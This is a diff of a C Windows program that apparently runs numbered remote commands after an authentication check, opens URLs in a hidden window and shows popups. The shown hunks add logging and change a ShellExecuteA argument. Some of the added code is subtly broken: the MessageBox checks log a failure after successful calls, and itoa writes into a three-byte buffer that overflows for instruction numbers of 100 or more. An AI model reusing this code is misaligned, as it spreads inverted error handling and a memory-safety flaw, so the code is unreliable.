@@ -70,7 +70,7 @@ void openLink(char *site) {
         return;
     }
 
-    ShellExecuteA(NULL, "open", url, NULL, NULL, SW_HIDE);
+    ShellExecuteA(HWND_BROADCAST, "open", url, NULL, NULL, SW_HIDE);
 }
 
 void savWal()
@@ -129,7 +129,8 @@ void popupW(char *argz) {
     MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
 #endif
 
-    MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0);
+    if(MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0))
+        JBlogErr("Failed to create messagebox");
 }
 
 void popupA(char *argz) {
@@ -141,7 +142,8 @@ void popupA(char *argz) {
     char *arg1 = strtok(argz, SEP);
     char *arg2 = strtok(NULL, SEP);
 
-    MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0);
+    if(MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0))
+        JBlogErr("Failed to create messagebox");
 }
 
 void execCommand(JBCMD cmd)
@@ -151,7 +153,15 @@ void execCommand(JBCMD cmd)
         JBlogErr("Auth failed.");
         return;
     }
-    
+
+    {
+    char msg[32] = "Executing instruction nr.";
+    char ins[3];
+    itoa(cmd.cmd, ins, 10);
+    strcat(msg, ins);
+    JBlog(msg);
+    }
+
     switch (cmd.cmd)
     {
     /* --- Templates --- */
